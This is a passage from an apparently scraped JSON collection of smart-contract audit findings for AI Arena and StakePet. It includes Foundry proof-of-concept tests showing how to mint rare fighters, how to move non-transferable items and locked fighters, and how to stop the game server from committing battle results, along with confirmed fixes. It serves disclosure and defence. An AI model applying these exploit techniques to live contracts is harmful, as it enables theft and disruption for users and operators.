[dendroid](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L509) will be minted for the caller.\n\n<details>\n\n```js\nfunction test_redeeming_dendroid_fighters_easily() public {\n    uint8[2] memory numToMint = [1, 0];\n    bytes memory signature = abi.encodePacked(\n        hex\"20d5c3e5c6b1457ee95bb5ba0cbf35d70789bad27d94902c67ec738d18f665d84e316edf9b23c154054c7824bba508230449ee98970d7c8b25cc07f3918369481c\"\n    );\n    string[] memory _tokenURIs = new string[](1);\n    _tokenURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n\n    // first i have to mint an nft from the mintpass contract\n    assertEq(_mintPassContract.mintingPaused(), false);\n    _mintPassContract.claimMintPass(numToMint, signature, _tokenURIs);\n    assertEq(_mintPassContract.balanceOf(_ownerAddress), 1);\n    assertEq(_mintPassContract.ownerOf(1), _ownerAddress);\n\n    // once owning one i can then redeem it for a fighter\n    uint256[] memory _mintpassIdsToBurn = new uint256[](1);\n    string[] memory _mintPassDNAs = new string[](1);\n    uint8[] memory _fighterTypes = new uint8[](1);\n    uint8[] memory _iconsTypes = new uint8[](1);\n    string[] memory _neuralNetHashes = new string[](1);\n    string[] memory _modelTypes = new string[](1);\n\n    _mintpassIdsToBurn[0] = 1;\n    _mintPassDNAs[0] = \"dna\";\n    _fighterTypes[0] = 1; // @audit Notice that I can provide value 1 which corresponds to Dendroid type\n    _neuralNetHashes[0] = \"neuralnethash\";\n    _modelTypes[0] = \"original\";\n    _iconsTypes[0] = 1;\n\n    // approve the fighterfarm contract to burn the mintpass\n    _mintPassContract.approve(address(_fighterFarmContract), 1);\n\n    _fighterFarmContract.redeemMintPass(\n    _mintpassIdsToBurn, _fighterTypes, _iconsTypes, _mintPassDNAs, _neuralNetHashes, _modelTypes\n    );\n\n    // check balance to see if we successfully redeemed the mintpass for a fighter\n    assertEq(_fighterFarmContract.balanceOf(_ownerAddress), 1);\n}\n```\n</details>\n\n```bash\nRan 1 test for test/FighterFarm.t.sol:FighterFarmTest\n[PASS] test_redeeming_dendroid_fighters_easily() (gas: 578678)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.56ms\n\nRan 1 test suite: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nThe player can also inspect previous transactions that minted a fighter with rare attributes, copy the provided `mintPassDnas` and provide them as [argument in the `redeemMintPass`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L237). The `_createNewFighter` function [calls `AiArenaHelper`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L510) to create the physical attributes for the fighter. The probability of attributes is [deterministic](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L107-L109) and since the player provided `dna` that already led to a fighter with rare attributes, his fighter will also have rare attributes.\n\n### Recommended Mitigation Steps\n\nThe main issue is that the mint pass token is not tied to the fighter properties that the player should claim and the player has complete freedom of the inputs. Consider implementing a signature mechanism that prevents the player from changing the fighter's properties like implemented in [claimFighters](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L206)\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/366#issuecomment-2018112817)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/10\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/21) and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/3).\n\n\n\n***\n\n",
      "summary": "\nThe function redeemMintPass in the FighterFarm contract allows players to exchange their mint passes for fighters' NFTs. However, there is a bug that allows players to easily mint fighters of type Dendroid and with low rarity attributes. This is because the function does not prevent players from customizing the fighters' properties and the physical attributes generation is deterministic. This issue has two major impacts: players can easily mint fighters of type Dendroid and with low rarity attributes, breaking the pseudo-randomness aspect of attribute generation. A proof of concept was provided to demonstrate how a player can easily exploit this bug. The recommended mitigation steps include implementing a signature mechanism to prevent players from changing the fighter's properties. The bug has been confirmed by the AI Arena team and they have implemented a mitigation to address it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/366",
      "tags": [],
      "finders": [
        "VrONTg",
        "3",
        "bhilare\\_",
        "zhaojohnson",
        "korok",
        "ahmedaghadi",
        "JCN",
        "Tendency",
        "0xAsen",
        "t0x1c",
        "givn",
        "shaka",
        "cats",
        "soliditywala",
        "0xAlix2",
        "Ryonen",
        "MrPotatoMagic",
        "klau5",
        "ke1caM",
        "pkqs90",
        "OMEN",
        "krikolkk",
        "denzi\\_",
        "SpicyMeatball",
        "haxatron",
        "VAD37",
        "d3e4",
        "ADM",
        "PetarTolev",
        "immeas",
        "Aamir",
        "devblixt",
        "0rpse",
        "yotov721",
        "stakog",
        "sl1",
        "alexzoid",
        "alexxander",
        "stackachu",
        "Zac",
        "radin100",
        "Abdessamed",
        "0xlemon",
        "dimulski",
        "McToady",
        "1",
        "vnavascues",
        "2",
        "0xmystery",
        "fnanni",
        "Velislav4o",
        "peter",
        "matejdb",
        "niser93",
        "DarkTower",
        "FloatingPragma",
        "adamn000",
        "jesjupyter",
        "Archime"
      ]
    },
    {
      "id": "32184",
      "title": "[H-02] Non-transferable `GameItems` can be transferred with `GameItems::safeBatchTransferFrom(...)`",
      "impact": "HIGH",
      "content": "\nThe `GamesItems` contract fails to appropriately override and include essential checks within the `safeBatchTransferFrom` function, enabling the transfer of non-transferrable Game Items.\n\n### Impact\n\nWhile the `GamesItems` contract allows for the designation of Game Items as either transferrable or non-transferrable through different states and overrides the `ERC1155::safeTransferFrom(...)` function accordingly, it neglects to override the `ERC1155::safeBatchTransferFrom(...)` function. This oversight permits users to transfer Game Items that were intended to be non-transferrable.\n\n### Proof of Concept\n\n**Here is a test for PoC:**\n\n> NOTE: Include the below given test in [`GameItems.t.sol`](https://github.com/code-423n4/2024-02-ai-arena/blob/main/test/GameItems.t.sol).\n\n<details>\n\n```solidity\n    function testNonTransferableItemCanBeTransferredWithBatchTransfer() public {\n        // funding owner address with 4k $NRN\n        _fundUserWith4kNeuronByTreasury(_ownerAddress);\n\n        // owner minting itme\n        _gameItemsContract.mint(0, 1);\n\n        // checking that the item is minted correctly\n        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 1);\n\n        // making the item non-transferable\n        _gameItemsContract.adjustTransferability(0, false);\n\n        vm.expectRevert();\n        // trying to transfer the non-transferable item. Should revert\n        _gameItemsContract.safeTransferFrom(_ownerAddress, _DELEGATED_ADDRESS, 0, 1, \"\");\n\n        // checking that the item is still in the owner's account\n        assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 0);\n        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 1);\n\n        // transferring the item using safeBatchTransferFrom\n        uint256[] memory ids = new uint256[](1);\n        ids[0] = 0;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1;\n        _gameItemsContract.safeBatchTransferFrom(_ownerAddress, _DELEGATED_ADDRESS, ids, amounts, \"\");\n\n        // checking that the item is transferred to the delegated address\n        assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 1);\n        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 0);\n    }\n```\n</details>\n\n*Output:*\n\n```bash\nâ”Œâ”€â”€(aamirusmani1552ã‰¿Victus)-[/mnt/d/ai-arena-audit]\nâ””â”€$ forge test --mt testNonTransferableItemCanBeTransferredWithBatchTransfer\n[â ’] Compiling...\n[â ƒ] Compiling 1 files with 0.8.13\n[â ’] Solc 0.8.13 finished in 1.77s\nCompiler run successful!\n\nRunning 1 test for test/GameItems.t.sol:GameItemsTest\n[PASS] testNonTransferableItemCanBeTransferredWithBatchTransfer() (gas: 190756)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.32ms\n \nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nIt is recommended to override the `safeBatchTransferFrom(...)` function and include the necessary checks to prevent the transfer of non-transferrable Game Items.\n\n<details>\n\n```diff\n+    function safeBatchTransferFrom(\n+        address from,\n+        address to,\n+        uint256[] memory ids,\n+        uint256[] memory amounts,\n+        bytes memory data\n+    ) public override(ERC1155) {\n+        for(uint256 i; i < ids.length; i++{\n+            require(allGameItemAttributes[ids[i]].transferable);\n+        }\n+        super.safeBatchTransferFrom(from, to, ids, amounts, data);\n+    }\n```\n\n</details>\n\nOr, consider overriding the `_safeBatchTransferFrom(...)` function as follows:\n\n<details>\n\n```diff\n+    function _safeBatchTransferFrom(\n+        address from,\n+        address to,\n+        uint256[] memory ids,\n+        uint256[] memory amounts,\n+        bytes memory data\n+    ) internal override(1155) {\n+        require(ids.length == amounts.length, \"ERC1155: ids and amounts length mismatch\");\n+        require(to != address(0), \"ERC1155: transfer to the zero address\");\n+\n+        address operator = _msgSender();\n+\n+        _beforeTokenTransfer(operator, from, to, ids, amounts, data);\n+\n+        for (uint256 i = 0; i < ids.length; ++i) {\n+            require(\n+            uint256 id = ids[i];\n+            uint256 amount = amounts[i];\n+           require(allGameItemAttributes[id].transferable);\n+            uint256 fromBalance = _balances[id][from];\n+            require(fromBalance >= amount, \"ERC1155: insufficient balance for transfer\");\n+            unchecked {\n+                _balances[id][from] = fromBalance - amount;\n+            }\n+            _balances[id][to] += amount;\n+        }\n+\n+        emit TransferBatch(operator, from, to, ids, amounts);\n+\n+        _afterTokenTransfer(operator, from, to, ids, amounts, data);\n+\n+        _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);\n+    }\n```\n</details>\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575#issuecomment-1975505890)**\n\n**[hickuphh3 (judge) increased severity to High](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575#issuecomment-1977961774)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> Fixed Non-transferable `GameItems` being transferred with `GameItems::safeBatchTransferFrom`.<br>\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/4\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/10), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/42), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/4).\n\n\n\n***\n\n",
      "summary": "\nThe `GamesItems` contract allows for the transfer of game items, but it fails to include important checks in the `safeBatchTransferFrom` function. This means that non-transferrable game items can still be transferred. A test has been included to demonstrate this issue. The recommended solution is to override the `safeBatchTransferFrom` function and include the necessary checks to prevent the transfer of non-transferrable game items. Alternatively, the `_safeBatchTransferFrom` function can be overridden. The AI Arena team has confirmed and mitigated this issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575",
      "tags": [],
      "finders": [
        "0x13",
        "zhaojohnson",
        "Kalogerone",
        "PedroZurdo",
        "korok",
        "kiqo",
        "al88nsk",
        "Tendency",
        "0xAsen",
        "Greed",
        "jaydhales",
        "shaka",
        "soliditywala",
        "0xKowalski",
        "SovaSlava",
        "0xAlix2",
        "0xaghas",
        "MidgarAudits",
        "visualbits",
        "juancito",
        "aslanbek",
        "0xbranded",
        "m4ttm",
        "csanuragjain",
        "ADM",
        "immeas",
        "Draiakoo",
        "kutugu",
        "thank\\_you",
        "merlinboii",
        "0xLogos",
        "Krace",
        "Jorgect",
        "fnanni",
        "Timenov",
        "KmanOfficial",
        "Ryonen",
        "ZanyBonzy",
        "0xBinChook",
        "tallo",
        "haxatron",
        "deadrxsezzz",
        "lil\\_eth",
        "0rpse",
        "Aymen0909",
        "Pelz",
        "0xWallSecurity",
        "dimulski",
        "McToady",
        "vnavascues",
        "0xprinc",
        "DMoore",
        "ni8mare",
        "0xvj",
        "sobieski",
        "cartlex\\_",
        "MrPotatoMagic",
        "pkqs90",
        "erosjohn",
        "krikolkk",
        "SpicyMeatball",
        "israeladelaja",
        "ktg",
        "GhK3Ndf",
        "btk",
        "0xE1",
        "nuthan2x",
        "alexzoid",
        "Bauchibred",
        "alexxander",
        "pa6kuda",
        "0xlemon",
        "evmboi32",
        "Limbooo",
        "CodeWasp",
        "shaflow2",
        "pynschon",
        "matejdb",
        "Fulum",
        "0xCiphky",
        "sashik\\_eth",
        "web3pwn",
        "tpiliposian",
        "oualidpro",
        "petro\\_1912",
        "ubl4nk",
        "jesjupyter",
        "xchen1130",
        "josephdara",
        "n0kto",
        "ladboy233",
        "cats",
        "djxploit",
        "Breeje",
        "grearlake",
        "0x11singh99",
        "solmaxis69",
        "klau5",
        "denzi\\_",
        "DeFiHackLabs",
        "hulkvision",
        "blutorque",
        "\\_eperezok",
        "Aamir",
        "jnforja",
        "devblixt",
        "stackachu",
        "BARW",
        "peter",
        "0xlyov",
        "0xpoor4ever",
        "Josh4324",
        "sandy",
        "novamanbg"
      ]
    },
    {
      "id": "32183",
      "title": "[H-01] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters",
      "impact": "HIGH",
      "content": "\n`FighterFarm` contract implements restrictions on the transferability of fighters in functions [transferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L338-L348) and [safeTransferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L355-L365), via the call to function [\\_ableToTransfer()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L539-L545). Unfortunately this approach doesn't cover all possible ways to transfer a fighter:  The `FighterFarm` contract inherits from OpenZeppelin's `ERC721` contract, which includes the public function [safeTransferFrom(..., data)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC721/ERC721.sol#L175-L183), i.e. the same as `safeTransferFrom()` but with the additional `data` parameter. This inherited function becomes available in the `GameItems` contract, and calling it allows us to circumvent the transferability restriction. As a result, a player will be able to transfer any of their fighters, irrespective of whether they are locked or not. Violation of such a basic system invariant leads to various kinds of impacts, including:\n\n*   The game server won't be able to commit some transactions;\n*   The transferred fighter becomes unstoppable (a transaction in which it loses can't be committed);\n*   The transferred fighter may be used as a \"poison pill\" to spoil another player, and prevent it from leaving the losing zone (a transaction in which it wins can't be committed).\n\nBoth of the last two impacts include the inability of the game server to commit certain transactions, so we illustrate both of the last two with PoCs, thus illustrating the first one as well.\n\n### Impact 1: A fighter becomes unstoppable, game server unable to commit\n\nIf a fighter wins a battle, [points are added](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L467) to [accumulatedPointsPerAddress mapping](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L113). When a fighter loses a battle, the reverse happens: [points are subtracted](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L486). If a fighter is transferred after it wins the battle to another address, `accumulatedPointsPerAddress` for the new address is empty, and thus the points can't be subtracted: **the game server transaction will be reverted**. By transferring the fighter to a new address after each battle, **the fighter becomes unstoppable**, as its accumulated points will only grow, and will never decrease.\n\n### Impact 2: Another fighter can't win, game server unable to commit\n\nIf a fighter loses a battle, funds are transferred from the amount at stake, to the stake-at risk, which is reflected in the [amountLost mapping](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L48-L49) of `StakeAtRisk` contract. If the fighter with stake-at-risk is transferred to another player, the invariant that `amountLost` reflects the lost amount per address is violated: after the transfer the second player has more stake-at-risk than before. A particular way to exploit this violation is demonstrated below: the transferred fighter may win a battle, which leads to [reducing amountLost](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L104) by the corresponding amount. Upon subsequent wins of the second player own fighters, this operation will underflow, leading to **the game server unable to commit transactions**, and **the player unable to exit the losing zone**. This effectively makes a fighter with the stake-at-risk a \"poison pill\".\n\n### Proof of Concept\n\n### Impact 1: A fighter becomes unstoppable, game server unable to commit\n\n<details>\n\n```diff\ndiff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol\nindex 6c5a1d7..dfaaad4 100644\n--- a/test/RankedBattle.t.sol\n+++ b/test/RankedBattle.t.sol\n@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {\n         assertEq(unclaimedNRN, 5000 * 10 ** 18);\n     }\n \n+   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!\n+    function testExploitTransferStakedFighterAndPlay() public {\n+        address player = vm.addr(3);\n+        address otherPlayer = vm.addr(4);\n+        _mintFromMergingPool(player);\n+        uint8 tokenId = 0;\n+        _fundUserWith4kNeuronByTreasury(player);\n+        vm.prank(player);\n+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);\n+        // The fighter wins one battle\n+        vm.prank(address(_GAME_SERVER_ADDRESS));\n+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);\n+        // The player transfers the fighter to other player\n+        vm.prank(address(player));\n+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, \"\");\n+        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);\n+        // The fighter can't lose\n+        vm.prank(address(_GAME_SERVER_ADDRESS));\n+        vm.expectRevert();\n+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);\n+        // The fighter can only win: it's unstoppable!\n+        vm.prank(address(_GAME_SERVER_ADDRESS));\n+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);\n+    }\n+\n     /*//////////////////////////////////////////////////////////////\n                                HELPERS\n     //////////////////////////////////////////////////////////////*/\n```\n\nPlace the PoC into `test/RankedBattle.t.sol`, and execute with\n\n    forge test --match-test testExploitTransferStakedFighterAndPlay\n\n</details>\n\n### Impact 2: Another fighter can't win, game server unable to commit\n\n<details>\n\n```diff\ndiff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol\nindex 6c5a1d7..196e3a0 100644\n--- a/test/RankedBattle.t.sol\n+++ b/test/RankedBattle.t.sol\n@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {\n         assertEq(unclaimedNRN, 5000 * 10 ** 18);\n     }\n \n+/// @notice Prepare two players and two fighters\n+function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {\n+    address player1 = vm.addr(3);\n+    _mintFromMergingPool(player1);\n+    uint8 fighter1 = 0;\n+    _fundUserWith4kNeuronByTreasury(player1);\n+    address player2 = vm.addr(4);\n+    _mintFromMergingPool(player2);\n+    uint8 fighter2 = 1;\n+    _fundUserWith4kNeuronByTreasury(player2);\n+    return (player1, player2, fighter1, fighter2);\n+}\n+\n+/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake\n+/// @notice After transferring the fighter, it wins the battle, \n+/// @notice and the second player can't exit from the stake-at-risk zone anymore.\n+function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {\n+    (address player1, address player2, uint8 fighter1, uint8 fighter2) = \n+        preparePlayersAndFighters();\n+    vm.prank(player1);\n+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);        \n+    vm.prank(player2);\n+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);        \n+    // Fighter1 loses a battle\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);\n+    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);\n+    // Fighter2 loses a battle\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);\n+    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);\n+\n+    // On the game server, player1 initiates a battle with fighter1,\n+    // then unstakes all remaining stake from fighter1, and transfers it\n+    vm.prank(address(player1));\n+    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);\n+    vm.prank(address(player1));\n+    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, \"\");\n+    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);\n+    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);\n+    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);\n+    // Fighter2 wins a battle, but the records can't be updated, due to underflow!\n+    vm.expectRevert();\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);\n+    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);\n+    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);\n+    assertEq(wins, 0);\n+    assertEq(ties, 0);\n+    assertEq(losses, 2);\n+}\n+\n     /*//////////////////////////////////////////////////////////////\n                                HELPERS\n     //////////////////////////////////////////////////////////////*/\n```\n\nPlace the PoC into `test/RankedBattle.t.sol`, and execute with\n\n    forge test --match-test testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer\n\n</details>\n\n### Recommended Mitigation Steps\n\nRemove the incomplete checks in the inherited functions `transferFrom()` and `safeTransferFrom()` of `FighterFarm` contract, and instead to enforce the transferability restriction via the `_beforeTokenTransfer()` hook, which applies equally to all token transfers, as illustrated below.\n\n<Details>\n\n```diff\ndiff --git a/src/FighterFarm.sol b/src/FighterFarm.sol\nindex 06ee3e6..9f9ac54 100644\n--- a/src/FighterFarm.sol\n+++ b/src/FighterFarm.sol\n@@ -330,40 +330,6 @@ contract FighterFarm is ERC721, ERC721Enumerable {\n         );\n     }\n \n-    /// @notice Transfer NFT ownership from one address to another.\n-    /// @dev Add a custom check for an ability to transfer the fighter.\n-    /// @param from Address of the current owner.\n-    /// @param to Address of the new owner.\n-    /// @param tokenId ID of the fighter being transferred.\n-    function transferFrom(\n-        address from, \n-        address to, \n-        uint256 tokenId\n-    ) \n-        public \n-        override(ERC721, IERC721)\n-    {\n-        require(_ableToTransfer(tokenId, to));\n-        _transfer(from, to, tokenId);\n-    }\n-\n-    /// @notice Safely transfers an NFT from one address to another.\n-    /// @dev Add a custom check for an ability to transfer the fighter.\n-    /// @param from Address of the current owner.\n-    /// @param to Address of the new owner.\n-    /// @param tokenId ID of the fighter being transferred.\n-    function safeTransferFrom(\n-        address from, \n-        address to, \n-        uint256 tokenId\n-    ) \n-        public \n-        override(ERC721, IERC721)\n-    {\n-        require(_ableToTransfer(tokenId, to));\n-        _safeTransfer(from, to, tokenId, \"\");\n-    }\n-\n     /// @notice Rolls a new fighter with random traits.\n     /// @param tokenId ID of the fighter being re-rolled.\n     /// @param fighterType The fighter type.\n@@ -448,7 +414,9 @@ contract FighterFarm is ERC721, ERC721Enumerable {\n         internal\n         override(ERC721, ERC721Enumerable)\n     {\n-        super._beforeTokenTransfer(from, to, tokenId);\n+        if(from != address(0) && to != address(0))\n+            require(_ableToTransfer(tokenId, to));\n+        super._beforeTokenTransfer(from, to , tokenId);\n     }\n \n     /*//////////////////////////////////////////////////////////////\n```\n\n</details>\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1709#issuecomment-2004609055)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> Fixed safeTransferFrom override with data.<br>\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/2\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/9), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/41), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/6).\n\n\n\n***\n\n",
      "summary": "\nThe `FighterFarm` contract has a problem with the transferability of fighters in two functions, `transferFrom()` and `safeTransferFrom()`. This is because the contract inherits from another contract called `ERC721` which has a function called `safeTransferFrom()` with an additional parameter. This allows players to transfer fighters even if they are restricted. This can cause problems such as the game server not being able to complete transactions and fighters becoming unstoppable. This bug can also be used to prevent other players from leaving the losing zone, making a fighter with funds at stake a \"poison pill\". Two examples of this impact are provided in the report. The recommended solution is to remove the incomplete checks in the inherited functions and instead enforce the transferability restriction through a different method. This bug has been confirmed by `brandinho` and mitigated by the AI Arena team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1709",
      "tags": [],
      "finders": [
        "0x13",
        "zhaojohnson",
        "Kalogerone",
        "PedroZurdo",
        "korok",
        "al88nsk",
        "Tendency",
        "0xAsen",
        "jaydhales",
        "shaka",
        "soliditywala",
        "0xAlix2",
        "0xaghas",
        "MidgarAudits",
        "juancito",
        "radev\\_sw",
        "aslanbek",
        "ADM",
        "immeas",
        "c0pp3rscr3w3r",
        "Draiakoo",
        "thank\\_you",
        "merlinboii",
        "0xLogos",
        "Krace",
        "fnanni",
        "peanuts",
        "KmanOfficial",
        "tallo",
        "deadrxsezzz",
        "d3e4",
        "Pelz",
        "dimulski",
        "vnavascues",
        "DMoore",
        "0xvj",
        "sobieski",
        "cartlex\\_",
        "MrPotatoMagic",
        "pkqs90",
        "erosjohn",
        "KupiaSec",
        "israeladelaja",
        "ktg",
        "GhK3Ndf",
        "btk",
        "0xE1",
        "nuthan2x",
        "alexzoid",
        "Bauchibred",
        "alexxander",
        "0xlemon",
        "evmboi32",
        "Limbooo",
        "1",
        "CodeWasp",
        "2",
        "matejdb",
        "Fulum",
        "web3pwn",
        "0xCiphky",
        "sashik\\_eth",
        "petro\\_1912",
        "oualidpro",
        "jesjupyter",
        "ubl4nk",
        "xchen1130",
        "cats",
        "grearlake",
        "klau5",
        "denzi\\_",
        "hulkvision",
        "DanielArmstrong",
        "blutorque",
        "\\_eperezok",
        "Aamir",
        "jnforja",
        "devblixt",
        "adam-idarrha",
        "stackachu",
        "BARW",
        "rouhsamad",
        "0xlyov",
        "Josh4324",
        "novamanbg"
      ]
    },
    {
      "id": "26171",
      "title": "Use != 0 instead of > 0 for unsigned integer comparison",
      "impact": "GAS",
      "content": "```solidity\nFile: StakePet.sol\n\n269:         if (_amount > 0) {\n\n299:         if (!petAlive && pet.ownership > 0) {\n\n432:         if (totYield > 0) {\n\n497:             if (_milkAmount > 0) {\n\n541:         if (yieldToWithdraw > 0) {\n\n558:                 require(yieldToWithdraw > 0); // This should never be hit and is maybe not needed, but just in case.\n\n562:                 require(yieldToWithdraw > 0); // This should never be hit and is maybe not needed, but just in case.\n\n709:         if (_totalYieldNoMilk > 0) {\n\n723:         if (s_totalOwnership > 0) {\n\n741:         if (s_totalOwnership > 0) {\n\n```\n\n```solidity\nFile: StakePetManager.sol\n\n129:             if (!stakePetContract.alive(pet.lastProofOfLife) && pet.ownership > 0) {\n\n```\n\n**Client:** Fixed in [9e3d0d0](https://github.com/Ranama/StakePet/commit/9e3d0d0c1b6a324e22e0e3f70453c6d411cd9101)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26170",
      "title": "Use shift Right/Left instead of division/multiplication if possible",
      "impact": "GAS",
      "content": "```solidity\nFile: StakePet.sol\n\n420:         if (_totalValueWantsClosedown <= totalValue() / 2) {\n\n```\n\n**Client:** Fixed in [540cca1](https://github.com/Ranama/StakePet/commit/540cca16669ee8575806d0f3430723726e3d9c2e)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
